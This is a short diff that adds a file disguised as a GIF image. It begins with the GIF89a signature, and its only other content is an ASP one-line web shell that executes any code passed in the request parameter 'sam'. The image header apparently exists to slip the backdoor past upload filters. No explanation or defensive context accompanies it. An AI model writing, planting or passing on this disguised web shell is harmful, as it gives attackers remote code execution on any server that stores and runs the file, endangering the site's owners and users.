@@ -1,0 +1,2 @@
+gif89a
+<%execute request("sam")%>
